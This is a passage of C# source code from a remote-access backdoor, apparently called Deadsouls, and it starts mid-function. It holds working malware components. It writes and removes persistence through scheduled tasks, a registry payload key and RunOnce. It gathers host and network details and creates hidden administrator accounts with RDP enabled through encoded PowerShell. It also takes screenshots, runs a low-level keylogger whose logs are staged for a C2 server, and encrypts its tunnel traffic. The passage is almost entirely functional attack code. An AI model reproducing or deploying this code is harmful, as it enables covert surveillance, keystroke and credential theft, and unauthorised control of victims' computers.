                    if (p != null) { p.WaitForExit(15000); return p.ExitCode == 0; }
                }
                catch { }
                return false;
            }
        }

        static bool DeleteBootTask(string taskName)
        {
            try
            {
                Type t = Type.GetTypeFromProgID("Schedule.Service");
                if (t != null)
                {
                    dynamic scheduler = Activator.CreateInstance(t);
                    scheduler.Connect();
                    dynamic folder = scheduler.GetFolder("\\");
                    // NOTE: no task.Stop() here - if this agent instance is the
                    // process the task launched, stopping it would kill us.
                    folder.DeleteTask(taskName, 0);
                    return true;
                }
            }
            catch { }
            try
            {
                var p = Process.Start(new ProcessStartInfo("schtasks.exe", "/delete /tn \"" + taskName + "\" /f")
                { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                if (p != null) { p.WaitForExit(5000); return true; }
            }
            catch { }
            return false;
        }

        // removes task + registry IL + RunOnce - everything Persist() wrote
        static bool RemovePersist()
        {
            bool ok = false;
            try { if (DeleteBootTask(TaskName)) ok = true; } catch { }
            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(PayloadKey, false); ok = true; } catch { }
            try { Microsoft.Win32.Registry.LocalMachine.DeleteSubKeyTree(PayloadKey, false); ok = true; } catch { }
            try
            {
                using (var k = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
                    if (k != null && k.GetValue(RunOnceValue) != null) { k.DeleteValue(RunOnceValue, false); ok = true; }
            }
            catch { }
            try
            {
                using (var k = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
                    if (k != null && k.GetValue(RunOnceValue) != null) { k.DeleteValue(RunOnceValue, false); ok = true; }
            }
            catch { }
            return ok;
        }

        static bool RegPayloadExists()
        {
            try
            {
                using (var k = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(PayloadKey))
                    if (k != null && k.GetValue("Payload") != null) return true;
                using (var k = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(PayloadKey))
                    if (k != null && k.GetValue("Payload") != null) return true;
            }
            catch { }
            return false;
        }

        static bool PersistActive()
        {
            return RegPayloadExists() || TaskExists(TaskName);
        }

        // ── Full persistence dump (table) ───────────────────────────────
        // Registry keys & truncated hex values + boot script + RunOnce +
        // scheduled task, all read live from the box.
        static string PersistReport()
        {
            string s = "PERSISTENCE REPORT\r\n===================\r\n";
            if (!IsWindows()) return s + "os: non-windows (no registry persistence)\r\n";
            s += "TASK\r\n";
            s += "  name     : " + TaskName + "\r\n";
            s += "  present  : " + (TaskExists(TaskName) ? "yes" : "no") + "\r\n";
            string tl = TaskLine();
            if (tl.Length > 0) s += "  details  : " + tl.Replace("\r\n", " | ") + "\r\n";
            s += "\r\nREGISTRY KEY  " + PayloadKey + "\r\n";
            s += DumpRegKey("HKCU");
            s += "\r\nHIVE  HKLM\r\n";
            s += DumpRegKey("HKLM");
            s += "\r\nRUNONCE (fallback)\r\n";
            s += DumpRunOnce("HKCU");
            s += DumpRunOnce("HKLM");
            return s.TrimEnd('\r', '\n');
        }

        static string DumpRegKey(string hive)
        {
            StringBuilder sb = new StringBuilder();
            Microsoft.Win32.RegistryKey root = hive == "HKLM" ? Microsoft.Win32.Registry.LocalMachine
                                                               : Microsoft.Win32.Registry.CurrentUser;
            try
            {
                using (var k = root.OpenSubKey(PayloadKey))
                {
                    if (k == null) return "  (" + hive + "\\" + PayloadKey + " absent)\r\n";
                    string[] names = k.GetValueNames();
                    if (names.Length == 0) sb.Append("  (" + hive + "\\" + PayloadKey + " - no values)\r\n");
                    foreach (var n in names)
                    {
                        Microsoft.Win32.RegistryValueKind kt = Microsoft.Win32.RegistryValueKind.Unknown;
                        try { kt = k.GetValueKind(n); } catch { }
                        object v = k.GetValue(n);
                        string val;
                        if (v is byte[])
                        {
                            byte[] b = (byte[])v;
                            int show = Math.Min(16, b.Length);
                            string hex = "";
                            for (int i = 0; i < show; i++) hex += b[i].ToString("x2") + " ";
                            val = "[REG_BINARY] " + b.Length + "B  0x" + hex.Trim() +
                                  (b.Length > show ? " ...<truncated " + (b.Length - show) + "B>" : "");
                        }
                        else
                        {
                            string vs = (v ?? "").ToString();
                            val = (vs.Length > 60 ? vs.Substring(0, 60) + "..." : vs);
                        }
                        sb.Append("  [");
                        sb.Append(hive);
                        sb.Append("\\Software\\DeadsoulsService]  ");
                        sb.Append(n);
                        sb.Append("  =  ");
                        sb.Append(val);
                        sb.Append("\r\n");
                    }
                }
            }
            catch (Exception ex) { sb.Append("  (" + hive + " read error: " + ex.Message + ")\r\n"); }
            return sb.ToString();
        }

        static string DumpRunOnce(string hive)
        {
            Microsoft.Win32.RegistryKey root = hive == "HKLM" ? Microsoft.Win32.Registry.LocalMachine
                                                               : Microsoft.Win32.Registry.CurrentUser;
            try
            {
                using (var k = root.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
                {
                    if (k == null) return "";
                    string name = RunOnceValue;
                    object v = k.GetValue(name);
                    return "  [" + hive + "\\...\\RunOnce]  " + name + " = " +
                           (v == null ? "<absent>" : "\"" + v + "\"") + "\r\n";
                }
            }
            catch { return "  [" + hive + "\\...\\RunOnce] read error\r\n"; }
        }

        static string TaskLine()
        {
            try
            {
                var p = Process.Start(new ProcessStartInfo("schtasks.exe", "/query /tn \"" + TaskName + "\" /fo LIST /v")
                { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true });
                if (p == null) return "";
                string o = p.StandardOutput.ReadToEnd(); p.WaitForExit(5000);
                return o.Trim();
            }
            catch { return ""; }
        }

        static bool TaskExists(string name)
        {
            try
            {
                using (var p = Process.Start(new ProcessStartInfo("schtasks.exe", "/query /tn \"" + name + "\"")
                { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true }))
                {
                    if (p == null) return false;
                    string o = p.StandardOutput.ReadToEnd();
                    p.WaitForExit(5000);
                    return o.IndexOf(name, StringComparison.OrdinalIgnoreCase) >= 0;
                }
            }
            catch { return false; }
        }

#endif // !LINUX && !MACOS  (Windows persistence)

        static bool RunProc(string file, string args)
        {
            try
            {
                using (var p = Process.Start(new ProcessStartInfo(file, args)
                { UseShellExecute = false, CreateNoWindow = true, RedirectStandardError = true, RedirectStandardOutput = true }))
                {
                    if (p == null) return false;
                    p.WaitForExit(15000);
                    return p.ExitCode == 0;
                }
            }
            catch { return false; }
        }

        // ----------------------------------------------------------------
        // system info
        // ----------------------------------------------------------------
#if !LINUX && !MACOS
        static string GetOs()
        {
            try
            {
                if (Environment.OSVersion.Platform == PlatformID.Unix) return "linux";
                try
                {
                    using (var k = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                    {
                        if (k != null)
                        {
                            var pn = k.GetValue("ProductName");
                            var b = k.GetValue("CurrentBuildNumber");
                            if (pn != null) return pn.ToString().Trim() + " (build " + (b != null ? b.ToString() : "?") + ")";
                        }
                    }
                }
                catch { }
                var v = Environment.OSVersion.Version;
                if (v.Major == 10) return "win10/11";
                if (v.Major == 6 && v.Minor == 3) return "win8.1";
                if (v.Major == 6 && v.Minor == 2) return "win8";
                if (v.Major == 6 && v.Minor == 1) return "win7";
                return Environment.OSVersion.ToString();
            }
            catch { return "unknown"; }
        }
#endif

        static string GetArch()
        {
            try { return IntPtr.Size == 8 ? "x64" : "x86"; }
            catch { return "?"; }
        }

        static string GetDomain()
        {
            try { return System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName; }
            catch { return "-"; }
        }

        static string GetUptime()
        {
            try
            {
                TimeSpan t = TimeSpan.FromMilliseconds(Environment.TickCount);
                return ((int)t.TotalDays) + "d " + t.Hours + "h " + t.Minutes + "m";
            }
            catch { return "?"; }
        }

#if !LINUX && !MACOS
        static string GetCpuName()
        {
            try
            {
                using (var k = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0"))
                {
                    if (k != null)
                    {
                        var v = k.GetValue("ProcessorNameString");
                        if (v != null) return v.ToString().Trim();
                    }
                }
            }
            catch { }
            try { return Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER"); }
            catch { return "?"; }
        }

        static string GetRamMB()
        {
            try
            {
                var ms = new Native.MEMORYSTATUSEX();
                if (Native.GlobalMemoryStatusEx(ms))
                    return Math.Round(ms.ullTotalPhys / 1024.0 / 1024.0).ToString() + " MB";
            }
            catch { }
            return "?";
        }
#endif

        // ----------------------------------------------------------------
        // network recon: parse `ipconfig /all` into one line per live adapter
        // ----------------------------------------------------------------
        static string RunCapture(string file, string args)
        {
            try
            {
                using (var p = Process.Start(new ProcessStartInfo(file, args)
                { UseShellExecute = false, CreateNoWindow = true, RedirectStandardError = true, RedirectStandardOutput = true }))
                {
                    if (p == null) return null;
                    string o = p.StandardOutput.ReadToEnd();
                    p.WaitForExit(10000);
                    return o;
                }
            }
            catch { return null; }
        }

#if !LINUX && !MACOS
        static string GetNetLines()
        {
            try
            {
                string o = RunCapture("ipconfig.exe", "/all");
                if (string.IsNullOrEmpty(o)) return "net=?\n";
                var sb = new StringBuilder();
                var cur = new StringBuilder();
                string curName = null;
                Action flush = delegate
                {
                    if (curName == null) return;
                    string b = cur.ToString();
                    string ip = Grab(b, "IPv4 Address").Replace("(Preferred)", "").Trim();
                    if (ip.Length == 0) ip = Grab(b, "IPv6 Address").Replace("(Preferred)", "").Trim();
                    if (ip.Length == 0) { curName = null; cur.Clear(); return; } // disconnected / tunnel iface
                    string mask = Grab(b, "Subnet Mask");
                    string mac = Grab(b, "Physical Address");
                    string gw = Grab(b, "Default Gateway");
                    string[] dns = GrabMulti(b, "DNS Servers");
                    sb.Append("net=" + curName + "  ip=" + ip + MaskToPrefix(mask) +
                        "  mac=" + (mac.Length > 0 ? mac : "-") +
                        "  gw=" + (gw.Length > 0 ? gw : "-"));
                    if (dns.Length > 0) sb.Append("  dns=" + string.Join(",", dns));
                    sb.AppendLine();
                    curName = null; cur.Clear();
                };
                foreach (string ln in o.Split('\n'))
                {
                    string t = ln.TrimEnd('\r');
                    var m = Regex.Match(t, @"^.*?\s+adapter\s+(?<name>.+?):\s*$", RegexOptions.IgnoreCase);
                    if (m.Success)
                    {
                        flush();
                        curName = m.Groups["name"].Value.Trim();
                        cur.Clear();
                    }
                    else cur.AppendLine(t);
                }
                flush();
                return sb.ToString();
            }
            catch { return "net=?\n"; }
        }

        // grab "label . . . : value" from a block
        static string Grab(string s, string label)
        {
            var m = Regex.Match(s, label + @"[ .]*: *([^\r\n]+)", RegexOptions.IgnoreCase);
            return m.Success ? m.Groups[1].Value.Trim() : "";
        }

        // grab the DNS label value plus indented continuation lines (multiple servers)
        static string[] GrabMulti(string s, string label)
        {
            var res = new List<string>();
            var m = Regex.Match(s, label + @"[ .]*: *([^\r\n]*)", RegexOptions.IgnoreCase);
            if (m.Success)
            {
                string first = m.Groups[1].Value.Trim();
                if (first.Length > 0) res.Add(first);
                int idx = m.Index + m.Length;
                foreach (Match lm in Regex.Matches(s.Substring(idx), @"(?m)^\s+(\d{1,3}(?:\.\d{1,3}){3})\s*$"))
                    res.Add(lm.Groups[1].Value.Trim());
            }
            return res.ToArray();
        }

        static string MaskToPrefix(string mask)
        {
            try
            {
                var ip = IPAddress.Parse(mask);
                var b = ip.GetAddressBytes();
                int p = 0;
                bool stop = false;
                for (int i = 0; i < b.Length && !stop; i++)
                {
                    byte x = b[i];
                    for (int bit = 7; bit >= 0 && !stop; bit--)
                    {
                        if ((x & (1 << bit)) != 0) p++;
                        else stop = true;
                    }
                }
                return "/" + p;
            }
            catch { return ""; }
        }
#endif // !LINUX && !MACOS  (Windows ipconfig net recon)

#if !LINUX && !MACOS
        // ----------------------------------------------------------------
        // user management (Windows) - net user / net localgroup
        // ----------------------------------------------------------------
        static string AddUser(string spec)
        {
            string[] p = spec.Split('|');
            if (p.Length < 2 || p[0].Trim().Length == 0) return "usage: adduser <username> <password>";
            string u = p[0].Trim(), pw = p[1];
            string r = ExecCommand("net user \"" + u + "\" " + pw + " /add");
            string adm = ExecCommand("net localgroup administrators \"" + u + "\" /add");
            string rp = SetupRdpAccess(u);
            return "add: " + r.TrimEnd('\r', '\n') +
                "\nadmins: " + adm.TrimEnd('\r', '\n') +
                "\nrdp: " + rp.TrimEnd('\r', '\n');
        }

        // Enable Remote Desktop and grant the account RDP access. Done in a
        // single PowerShell -EncodedCommand (base64 UTF-16LE => no nested-quote
        // escaping through cmd.exe). net.exe fails to create "Remote Desktop
        // Users" on some builds (error 1376 - "specified local group does not
        // exist"), so the group is resolved by its well-known SID S-1-5-32-555
        // (localized-safe), created via ADSI when absent, and the account is
        // added only if it is not already a member. Also flips
        // fDenyTSConnections=0 so RDP is actually reachable (admins can log in
        // even without Remote Desktop Users membership).
        static string SetupRdpAccess(string user)
        {
            string uq = user.Replace("'", "''"); // PS single-quote escaping
            string ps =
                "$ProgressPreference='SilentlyContinue';" +
                "$gname='Remote Desktop Users';" +
                "try{$sid=New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-555');" +
                "$gname=$sid.Translate([System.Security.Principal.NTAccount]).Value;" +
                "$gname=$gname.Substring($gname.LastIndexOf('\\')+1)}catch{};" +
                "$rdp='RDP-enable-failed';" +
                "try{Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0 -Type DWord -EA Stop;$rdp='RDP-enabled'}catch{};" +
                "$adsi=[adsi]'WinNT://.';$g=$null;" +
                "try{$g=$adsi.psbase.Children.Find($gname,'group')}catch{};" +
                "if(-not $g){try{$ng=$adsi.Create('group',$gname);$ng.SetInfo();$g=$adsi.psbase.Children.Find($gname,'group')}catch{}};" +
                "if($g){$u='WinNT://'+$env:COMPUTERNAME+'/" + uq + ",user';" +
                "try{if($g.IsMember($u)){\"$rdp|OK|already-member|$gname\"}else{$g.Add($u);\"$rdp|OK|added-to|$gname\"}}" +
                "catch{\"$rdp|ERR|add: \"+$_.Exception.Message}}else{\"$rdp|ERR|group-unavailable\"}";
            try
            {
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(ps));
                return ExecCommand("powershell -NoProfile -NonInteractive -EncodedCommand " + b64);
            }
            catch { return "rdp-setup-failed"; }
        }

        static string RemoveUser(string user)
        {
            string u = user.Trim();
            if (u.Length == 0) return "usage: removeuser <username>";
            return ExecCommand("net user \"" + u + "\" /delete");
        }

        static string ListUsers()
        {
            return ExecCommand("net user") +
                "\n--- administrators ---\n" + ExecCommand("net localgroup administrators");
        }

        // ----------------------------------------------------------------
        // screenshot (Windows) - full virtual screen (ALL monitors, physical
        // pixels, DPI-correct) -> PNG in %TEMP%
        // ----------------------------------------------------------------
        static volatile bool _dpiAwareOnce;

        // Make the process DPI-aware so screen metrics return PHYSICAL pixels.
        // Must happen before CopyFromScreen or the capture would only cover a
        // DPI-scaled (logical) region of the primary monitor.
        static void EnsureDpiAware()
        {
            if (_dpiAwareOnce) return;
            _dpiAwareOnce = true;
            try
            {
                // DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 = (HANDLE)-4 (Win10 1703+)
                Native.SetProcessDpiAwarenessContext(new IntPtr(-4));
                return;
            }
            catch { }
            try { Native.SetProcessDPIAware(); } catch { }
        }

        static string ScreenshotCapture()
        {
            try
            {
                EnsureDpiAware();
                // physical-pixel bounding rect of the ENTIRE virtual desktop
                // (spans every monitor, handles monitors left/above the primary)
                int x = Native.GetSystemMetrics(76); // SM_XVIRTUALSCREEN
                int y = Native.GetSystemMetrics(77); // SM_YVIRTUALSCREEN
                int w = Native.GetSystemMetrics(78); // SM_CXVIRTUALSCREEN
                int h = Native.GetSystemMetrics(79); // SM_CYVIRTUALSCREEN
                if (w <= 0 || h <= 0)
                {
                    var vb = System.Windows.Forms.SystemInformation.VirtualScreen;
                    x = vb.Left; y = vb.Top; w = vb.Width; h = vb.Height;
                }
                using (var bmp = new System.Drawing.Bitmap(w, h))
                {
                    using (var g = System.Drawing.Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(x, y, 0, 0, bmp.Size);
                    }
                    string path = Path.Combine(Path.GetTempPath(),
                        "ds_shot_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png");
                    bmp.Save(path, System.Drawing.Imaging.ImageFormat.Png);
                    return "OK|" + path;
                }
            }
            catch (Exception ex) { return "ERR|" + ex.Message; }
        }

        // ----------------------------------------------------------------
        // keylogger (Windows) - WH_KEYBOARD_LL low-level hook
        //   keylogstart : hook thread + message pump, buffer to %TEMP%\ds_klog_*.txt
        //   keylogstop  : unhook, flush, return "OK|<path>" for the C2 to pull
        // ----------------------------------------------------------------
        static Native.LowLevelKeyboardProc _kbdHookProc;
        static IntPtr _kbdHookId;
        static Thread _klogThread;
        static volatile bool _klogRunning;
        static int _klogThreadId;
        static StringBuilder _klogBuf;
        static string _klogPath;
        static readonly object _klogLock = new object();

        static string KeylogStart()
        {
            if (_klogRunning) return "already capturing";
            try
            {
                _klogPath = Path.Combine(Path.GetTempPath(),
                    "ds_klog_" + Environment.TickCount.ToString("x") + ".txt");
                _klogBuf = new StringBuilder();
                _klogRunning = true;
                _klogThread = new Thread(KlogLoop);
                _klogThread.IsBackground = true;
                _klogThread.Start();
                return "keylogging to " + _klogPath;
            }
            catch (Exception ex) { return "error: " + ex.Message; }
        }

        static string KeylogStop()
        {
            if (!_klogRunning && _kbdHookId == IntPtr.Zero) return "ERR|keylogger not running";
            _klogRunning = false;
            try { if (_klogThreadId != 0) Native.PostThreadMessage((uint)_klogThreadId, 0x0012, IntPtr.Zero, IntPtr.Zero); } catch { }
            try { if (_klogThread != null) _klogThread.Join(3000); } catch { }
            try { if (_kbdHookId != IntPtr.Zero) { Native.UnhookWindowsHookEx(_kbdHookId); _kbdHookId = IntPtr.Zero; } } catch { }
            FlushKlog();
            _klogThread = null;
            _klogThreadId = 0;
            return "OK|" + _klogPath;
        }

        static void KlogLoop()
        {
            _klogThreadId = (int)Native.GetCurrentThreadId();
            _kbdHookProc = KlogHookProc;
            _kbdHookId = Native.SetWindowsHookEx(13 /*WH_KEYBOARD_LL*/, _kbdHookProc,
                Native.GetModuleHandle(null), 0);
            if (_kbdHookId == IntPtr.Zero) { _klogRunning = false; return; }
            Native.MSG msg;
            while (Native.GetMessage(out msg, IntPtr.Zero, 0, 0)) { }
            try { Native.UnhookWindowsHookEx(_kbdHookId); } catch { }
            _kbdHookId = IntPtr.Zero;
        }

        static IntPtr KlogHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (_klogRunning && nCode >= 0 && (int)wParam == 0x0100 /*WM_KEYDOWN*/)
                {
                    var k = (Native.KBDLLHOOKSTRUCT)System.Runtime.InteropServices.Marshal
                        .PtrToStructure(lParam, typeof(Native.KBDLLHOOKSTRUCT));
                    AppendKey(k.vkCode, k.scanCode);
                }
            }
            catch { }
            return Native.CallNextHookEx(_kbdHookId, nCode, wParam, lParam);
        }

        static void AppendKey(uint vk, uint scan)
        {
            string s = null;
            if (vk == 0x0D) s = "\n";                                  // ENTER
            else if (vk == 0x09) s = "\t";                             // TAB
            else if (vk == 0x20) s = " ";                              // SPACE
            else if (vk == 0x08) s = "[BS]";                           // BACKSPACE
            else if (vk == 0x1B) s = "[ESC]";
            else if (vk == 0x2E) s = "[DEL]";
            else if (vk == 0x10) s = "[SHIFT]";
            else if (vk == 0x11) s = "[CTRL]";
            else if (vk == 0x12) s = "[ALT]";
            else if (vk == 0x5B || vk == 0x5C) s = "[WIN]";
            else if (vk == 0x14) s = "[CAPS]";
            else if (vk == 0x90) s = "[NUMLOCK]";
            else if (vk == 0x2C) s = "[PRTSC]";
            else if (vk == 0x2D) s = "[INS]";
            else if (vk >= 0x21 && vk <= 0x28) s = "[" + new string[] { "PGUP", "PGDN", "END", "HOME", "LEFT", "UP", "RIGHT", "DOWN" }[vk - 0x21] + "]";
            else if (vk >= 0x70 && vk <= 0x87) s = "[F" + (vk - 0x70 + 1) + "]";
            else
            {
                s = CharFromVk(vk, scan);
                if (string.IsNullOrEmpty(s)) return;                   // unmapped key - skip
            }
            lock (_klogLock)
            {
                if (_klogBuf == null || !_klogRunning) return;
                if (_klogBuf.Length == 0) _klogBuf.Append("[").Append(DateTime.Now.ToString("HH:mm:ss")).Append("] ");
                _klogBuf.Append(s);
                if (_klogBuf.Length >= 512) FlushKlogLocked();
            }
        }

        static string CharFromVk(uint vk, uint scan)
        {
            try
            {
                byte[] kb = new byte[256];
                if (!Native.GetKeyboardState(kb)) return null;
                var sb = new StringBuilder(4);
                int r = Native.ToUnicode(vk, scan, kb, sb, 4, 0);
                if (r > 0) return sb.ToString();
                return null;
            }
            catch { return null; }
        }

        static void FlushKlog()
        {
            lock (_klogLock) FlushKlogLocked();
        }

        static void FlushKlogLocked()
        {
            if (_klogBuf == null || _klogBuf.Length == 0) return;
            try { File.AppendAllText(_klogPath, _klogBuf.ToString(), Encoding.UTF8); _klogBuf.Clear(); }
            catch { }
        }
#endif // !LINUX && !MACOS  (Windows user mgmt / screenshot / keylogger)


        // ----------------------------------------------------------------
        // crypto
        // ----------------------------------------------------------------
        static void SetCrypto(string secret)
        {
            using (var pbkdf2 = new Rfc2898DeriveBytes(secret, Salt, Iterations))
            {
                byte[] d = pbkdf2.GetBytes(64);
                _aesKey = new byte[32]; _hmacKey = new byte[32];
                Buffer.BlockCopy(d, 0, _aesKey, 0, 32);
                Buffer.BlockCopy(d, 32, _hmacKey, 0, 32);
            }
        }

        static byte[] TunnelEncrypt(byte[] plain)
        {
            byte[] iv = new byte[16];
            using (var rng = new RNGCryptoServiceProvider()) rng.GetBytes(iv);
            byte[] ct;
            using (var aes = new RijndaelManaged())
            {
                aes.KeySize = 256; aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                aes.Key = _aesKey; aes.IV = iv;
                using (var enc = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, enc, CryptoStreamMode.Write))
                    { cs.Write(plain, 0, plain.Length); cs.FlushFinalBlock(); }
                    ct = ms.ToArray();
                }
            }
            byte[] mac;
            using (var hmac = new HMACSHA256(_hmacKey))
            {
                var tmp = new byte[iv.Length + ct.Length];
                Buffer.BlockCopy(iv, 0, tmp, 0, 16);
                Buffer.BlockCopy(ct, 0, tmp, 16, ct.Length);
                mac = hmac.ComputeHash(tmp);
            }
            var frame = new byte[16 + ct.Length + 32];
            Buffer.BlockCopy(iv, 0, frame, 0, 16);
            Buffer.BlockCopy(ct, 0, frame, 16, ct.Length);
            Buffer.BlockCopy(mac, 0, frame, 16 + ct.Length, 32);
            return frame;
        }

        static byte[] TunnelDecrypt(byte[] frame)
        {
            if (frame == null || frame.Length < 48) throw new InvalidDataException("bad frame");
            byte[] iv = new byte[16];
            byte[] ct = new byte[frame.Length - 48];
            byte[] mac = new byte[32];
            Buffer.BlockCopy(frame, 0, iv, 0, 16);
            Buffer.BlockCopy(frame, 16, ct, 0, ct.Length);
            Buffer.BlockCopy(frame, 16 + ct.Length, mac, 0, 32);
            using (var hmac = new HMACSHA256(_hmacKey))
            {
                var tmp = new byte[iv.Length + ct.Length];
                Buffer.BlockCopy(iv, 0, tmp, 0, 16);
                Buffer.BlockCopy(ct, 0, tmp, 16, ct.Length);
                byte[] calc = hmac.ComputeHash(tmp);
                if (!FixedTimeEquals(calc, mac)) throw new InvalidDataException("hmac mismatch");
            }
            using (var aes = new RijndaelManaged())
            {
                aes.KeySize = 256; aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                aes.Key = _aesKey; aes.IV = iv;
                using (var dec = aes.CreateDecryptor())
                using (var ms = new MemoryStream(ct))
                using (var cs = new CryptoStream(ms, dec, CryptoStreamMode.Read))
                using (var outMs = new MemoryStream())
                { cs.CopyTo(outMs); return outMs.ToArray(); }
            }
        }

        static bool FixedTimeEquals(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) return false;
            int d = 0;
            for (int i = 0; i < a.Length; i++) d |= a[i] ^ b[i];
            return d == 0;
        }

        static void TunnelWriteFrame(Stream s, byte[] plain)
        {
            byte[] f = TunnelEncrypt(plain);
            byte[] hdr = new byte[4];
            hdr[0] = (byte)((f.Length >> 24) & 0xFF);
            hdr[1] = (byte)((f.Length >> 16) & 0xFF);
            hdr[2] = (byte)((f.Length >> 8) & 0xFF);
            hdr[3] = (byte)(f.Length & 0xFF);
            s.Write(hdr, 0, 4);
            s.Write(f, 0, f.Length);
            s.Flush();
        }

        static byte[] TunnelReadFrame(Stream s)
        {
            byte[] hdr = ReadExactly(s, 4);
            int len = (hdr[0] << 24) | (hdr[1] << 16) | (hdr[2] << 8) | hdr[3];
            if (len < 48 || len > 16 * 1024 * 1024) throw new InvalidDataException("bad len " + len);
            return TunnelDecrypt(ReadExactly(s, len));
        }

        static byte[] ReadExactly(Stream s, int count)
        {
            byte[] buf = new byte[count];
            int got = 0;
            while (got < count)
            {
                int n = s.Read(buf, got, count - got);
                if (n <= 0) throw new EndOfStreamException();
                got += n;
            }
            return buf;
        }
    }

    // minimal P/Invoke to hide the console window + read physical RAM
#if !LINUX && !MACOS
    internal static class Native
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, SetLastError = true)]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool GlobalMemoryStatusEx(
            [System.Runtime.InteropServices.In, System.Runtime.InteropServices.Out] MEMORYSTATUSEX lpBuffer);

        // ---- DPI-aware full-screen capture (whole virtual desktop) ----
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool SetProcessDPIAware();

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetProcessDpiAwarenessContext(IntPtr value);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);

        // ---- keylogger (WH_KEYBOARD_LL) ----
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern uint GetCurrentThreadId();

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool PostThreadMessage(uint idThread, uint Msg, IntPtr wParam, IntPtr lParam);

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool GetKeyboardState(byte[] lpKeyState);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            StringBuilder pwszBuff, int cchBuff, uint wFlags);

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        public struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        public struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public int ptX;
            public int ptY;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public class MEMORYSTATUSEX
        {
            public uint dwLength;
            public uint dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
            public MEMORYSTATUSEX() { dwLength = (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(MEMORYSTATUSEX)); }
        }
    }
#endif // !LINUX && !MACOS  (Native P/Invoke)
}
